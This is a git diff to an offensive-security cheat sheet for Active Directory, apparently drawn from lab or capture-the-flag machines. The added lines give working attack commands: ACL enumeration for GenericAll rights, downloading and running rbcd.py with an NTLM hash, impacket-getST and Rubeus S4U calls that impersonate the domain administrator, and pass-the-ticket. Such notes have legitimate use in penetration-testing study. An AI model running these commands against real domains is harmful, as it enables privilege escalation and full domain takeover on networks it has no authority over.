@@ -640,6 +640,9 @@ Invoke-UserHunter
 Get-NetSession -Verbose -ComputerName web04 
 Get-NetUser -SPN | select samaccountname,serviceprincipalname
 Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName
+
+Get-ObjectAcl -Identity "L.Livingstone" | ?{$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights
+"S-1-5-21-537427935-490066102-1511301751-512","S-1-5-32-548","S-1-5-18,S-1-5-21-537427935-490066102-1511301751-519" | Convert-SidToName
 ```
 ### winPEAS
 ```powershell
@@ -922,7 +925,7 @@ https://github.com/calebstewart/CVE-2021-1675
 https://github.com/GossiTheDog/HiveNightmare/releases/tag/0.6
 
 ### S4U
-#### Rubeus
+#### BASIC
 https://github.com/Kevin-Robertson/Powermad
 <br/>
 https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/resource-based-constrained-delegation
@@ -941,9 +944,16 @@ $SDBytes = New-Object byte[] ($SD.BinaryLength)
 $SD.GetBinaryForm($SDBytes, 0)
 Get-DomainComputer TEST | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes} -Verbose
 
+
+wget https://raw.githubusercontent.com/tothi/rbcd-attack/master/rbcd.py
+python3 rbcd.py -dc-ip 192.168.171.175 -t RESOURCEDC -f 'TEST' -hashes :19a3a7550ce8c505c2d46b5e39d6f808 resourced\\l.livingstone
+impacket-getST -spn cifs/ResourceDC.resourced.local resourced/TEST:'123456' -impersonate administrator -dc-ip 192.168.171.175
+export KRB5CCNAME=./Administrator.ccache
+
 .\Rubeus.exe hash /user:TEST$ /password:123456 /domain:authority.htb
-.\Rubeus.exe s4u /user:TEST$ /rc4:32ED87BDB5FDC5E9CBA88547376818D4 /impersonateuser:svc_ldap /msdsspn:cifs/TEST.authority.htb /ptt
+.\Rubeus.exe s4u /user:TEST$ /rc4:32ED87BDB5FDC5E9CBA88547376818D4 /impersonateuser:administrator /msdsspn:cifs/TEST.authority.htb /ptt /nowrap
 ```
+
 #### nopac
 ```powershell
 cd /opt/noPac
